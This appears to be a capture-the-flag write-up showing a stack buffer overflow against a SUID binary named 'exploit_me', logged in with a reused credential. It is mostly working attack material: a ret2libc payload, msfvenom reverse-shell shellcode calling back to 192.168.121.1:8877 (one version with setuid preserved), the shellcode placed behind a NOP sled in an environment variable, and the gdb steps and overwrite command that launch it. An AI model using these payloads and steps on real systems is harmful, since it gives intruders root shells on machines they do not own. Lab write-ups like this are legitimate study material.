We ssh as zaz with the password we got from the writeup 2

```
zaz : 646da671ca01bb5d84dbb5fb2238dc8e
```

![](../Images/Pasted%20image%2020240806220442.png)

In the second writeup, we found an offset of 140 chunck
We'll reuse this offset and store a payload in the environment variables
We'll use gdb to find the address of this variable and replace the ret2libc by it in order to trigger a reverse shell

The previous exploit was
```
❯ python3
>>> from pwn import *
>>> print(140 * b"A"+pack(0xb7e6b060)+pack(0xb7e5ebe0)+pack(0xb7f8cc58))
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`\xb0\xe6\xb7\xe0\xeb\xe5\xb7X\xcc\xf8\xb7'
```

Let's create the other payload with msfvenom

```
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.121.1 LPORT=8877 -f py –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7"
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95export EVIL=`python -c 'print "\x90" * 525 +  "\xbd\x56\x57\x8c\x14\xdb\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x13\x31\x6a\x15\x03\x6a\x15\x83\xc2\x04\xe2\xa3\x66\x57\x7e\x5c\xd1\xaa\xff\x53\x3a\xc3\xe3\xc0\xff\x7f\x8e\xe4\x76\x9e\xfe\x8e\x45\xe1\x6c\x17\xe6\xdd\x5f\x27\x4f\x5b\x99\x4f\x90\x33\x20\x8e\x78\x46\xd3\xb2\xd5\xcf\x32\x02\x43\x80\xe5\x31\x3f\x23\x8f\x54\xf2\xa4\xdd\xfe\x63\x8a\x92\x96\x13\xfb\x7b\x04\x8d\x8a\x67\x9a\x1e\x04\x86\xaa\xaa\xdb\xc9"'`
Payload size: 95 bytes
Final size of py file: 479 bytes
buf =  b""
buf += b"\xbe\xbd\x5e\x33\xdd\xda\xdf\xd9\x74\x24\xf4\x5b"
buf += b"\x29\xc9\xb1\x12\x31\x73\x12\x83\xc3\x04\x03\xce"
buf += b"\x50\xd1\x28\x01\xb6\xe2\x30\x32\x0b\x5e\xdd\xb6"
buf += b"\x02\x81\x91\xd0\xd9\xc2\x41\x45\x52\xfd\xa8\xf5"
buf += b"\xdb\x7b\xca\x9d\x1b\xd3\x55\x5c\xf4\x26\xa6\x7c"
buf += b"\xa9\xae\x47\x30\xd7\xe0\xd6\x63\xab\x02\x50\x62"
buf += b"\x06\x84\x30\x0c\xf7\xaa\xc7\xa4\x6f\x9a\x08\x56"
buf += b"\x19\x6d\xb5\xc4\x8a\xe4\xdb\x58\x27\x3a\x9b"
```

```
"\xbe\xbd\x5e\x33\xdd\xda\xdf\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x12\x31\x73\x12\x83\xc3\x04\x03\xce\x50\xd1\x28\x01\xb6\xe2\x30\x32\x0b\x5e\xdd\xb6\x02\x81\x91\xd0\xd9\xc2\x41\x45\x52\xfd\xa8\xf5\xdb\x7b\xca\x9d\x1b\xd3\x55\x5c\xf4\x26\xa6\x7c\xa9\xae\x47\x30\xd7\xe0\xd6\x63\xab\x02\x50\x62\x06\x84\x30\x0c\xf7\xaa\xc7\xa4\x6f\x9a\x08\x56\x19\x6d\xb5\xc4\x8a\xe4\xdb\x58\x27\x3a\x9b"
```

```
export EVIL=`python -c 'print "\x90" * 525 + "\xbe\xbd\x5e\x33\xdd\xda\xdf\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x12\x31\x73\x12\x83\xc3\x04\x03\xce\x50\xd1\x28\x01\xb6\xe2\x30\x32\x0b\x5e\xdd\xb6\x02\x81\x91\xd0\xd9\xc2\x41\x45\x52\xfd\xa8\xf5\xdb\x7b\xca\x9d\x1b\xd3\x55\x5c\xf4\x26\xa6\x7c\xa9\xae\x47\x30\xd7\xe0\xd6\x63\xab\x02\x50\x62\x06\x84\x30\x0c\xf7\xaa\xc7\xa4\x6f\x9a\x08\x56\x19\x6d\xb5\xc4\x8a\xe4\xdb\x58\x27\x3a\x9b"'`
```

![](../Images/Pasted%20image%2020240806222428.png)

```
b *main
r
x/s *((char **)environ+3)
```

![](../Images/Pasted%20image%2020240806230328.png)

This command shows us the EVIL env variable

We'll see how this variable takes the memory
```
x/150xg 0xbffff425
```

We see our nop field, we just have to choose one of its addresses to replace the ret2libc

```
./exploit_me $(python -c 'print "i"*140 + "\x3f\xf7\xff\xbf"')
```

![](../Images/Pasted%20image%2020240806223416.png)

The reverse shell worked but it didn't take the SUID

We'll craft the same payload again but with `PrepenSetuid=True`, which will keep the SUID

```
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.121.1 LPORT=8877 -f py –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7" PrependSetuid=True
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 102 (iteration=0)
x86/shikata_ga_nai chosen with final size 102
Payload size: 102 bytes
Final size of py file: 518 bytes
buf =  b""
buf += b"\xbd\x56\x57\x8c\x14\xdb\xdb\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x13\x31\x6a\x15\x03\x6a\x15\x83\xc2"
buf += b"\x04\xe2\xa3\x66\x57\x7e\x5c\xd1\xaa\xff\x53\x3a"
buf += b"\xc3\xe3\xc0\xff\x7f\x8e\xe4\x76\x9e\xfe\x8e\x45"
buf += b"\xe1\x6c\x17\xe6\xdd\x5f\x27\x4f\x5b\x99\x4f\x90"
buf += b"\x33\x20\x8e\x78\x46\xd3\xb2\xd5\xcf\x32\x02\x43"
buf += b"\x80\xe5\x31\x3f\x23\x8f\x54\xf2\xa4\xdd\xfe\x63"
buf += b"\x8a\x92\x96\x13\xfb\x7b\x04\x8d\x8a\x67\x9a\x1e"
buf += b"\x04\x86\xaa\xaa\xdb\xc9"

export EVIL=`python -c 'print "\x90" * 525 +  "\xbd\x56\x57\x8c\x14\xdb\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x13\x31\x6a\x15\x03\x6a\x15\x83\xc2\x04\xe2\xa3\x66\x57\x7e\x5c\xd1\xaa\xff\x53\x3a\xc3\xe3\xc0\xff\x7f\x8e\xe4\x76\x9e\xfe\x8e\x45\xe1\x6c\x17\xe6\xdd\x5f\x27\x4f\x5b\x99\x4f\x90\x33\x20\x8e\x78\x46\xd3\xb2\xd5\xcf\x32\x02\x43\x80\xe5\x31\x3f\x23\x8f\x54\xf2\xa4\xdd\xfe\x63\x8a\x92\x96\x13\xfb\x7b\x04\x8d\x8a\x67\x9a\x1e\x04\x86\xaa\xaa\xdb\xc9"'`
```

![](../Images/Pasted%20image%2020240806231545.png)